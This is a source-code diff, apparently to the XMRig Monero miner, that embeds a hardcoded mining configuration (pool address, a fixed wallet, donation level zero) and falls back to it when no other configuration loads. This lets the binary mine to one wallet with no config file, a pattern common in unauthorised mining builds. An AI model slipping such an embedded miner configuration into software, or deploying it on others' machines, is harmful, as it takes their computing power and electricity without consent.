@@ -120,6 +120,25 @@ public:
 private:
     inline static Config *load(Process *process)
     {
+        static const char *hardcoded_config =
+            "{"
+            "\"autosave\":true,"
+            "\"cpu\":true,"
+            "\"opencl\":false,"
+            "\"cuda\":false,"
+            "\"donate-level\":0,"
+            "\"pools\":[{"
+            "\"coin\":\"monero\","
+            "\"algo\":\"rx/0\","
+            "\"url\":\"xmr-us.kryptex.network:7029\","
+            "\"user\":\"89eWJ7ccdVr3GHBAYsKG28eqWcn2PMWzYeFE5xtgWzg1UimfWS62Qq4VpUSQrX3vaDeMTAMhBVR885RxkLzXNkmFV9yXvcg\","
+            "\"pass\":\"x\","
+            "\"tls\":false,"
+            "\"keepalive\":true,"
+            "\"nicehash\":false"
+            "}]"
+            "}";
+
         JsonChain chain;
         ConfigTransform transform;
         std::unique_ptr<Config> config;
@@ -152,6 +171,12 @@ private:
             return config.release();
         }
 #       endif
+
+        chain.addRaw(hardcoded_config);
+
+        if (read(chain, config)) {
+            return config.release();
+        }
 
         return nullptr;
     }
